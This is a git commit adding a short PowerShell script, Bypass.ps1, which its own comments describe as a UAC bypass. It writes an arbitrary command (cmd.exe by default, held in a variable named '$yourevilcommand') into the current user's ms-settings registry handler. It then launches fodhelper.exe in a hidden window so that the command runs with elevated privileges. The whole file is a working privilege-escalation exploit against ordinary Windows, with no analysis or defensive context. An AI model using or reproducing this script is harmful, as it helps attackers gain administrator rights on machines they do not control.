6721c13ca41200df051d4dd5d02b6741b4621dbc
avi <51239727+avi7611@users.noreply.github.com>
2020-10-12 10:25:32 +0530

    Create Bypass.ps1

---
+++ Bypass.ps1
@@ -0,0 +1,13 @@
+#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
+
+$yourevilcommand = "C:\Windows\System32\cmd.exe"
+
+#Adding all the reistry required with your command.
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
+
+#Starts the fodhelper process to execute your command.
+
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
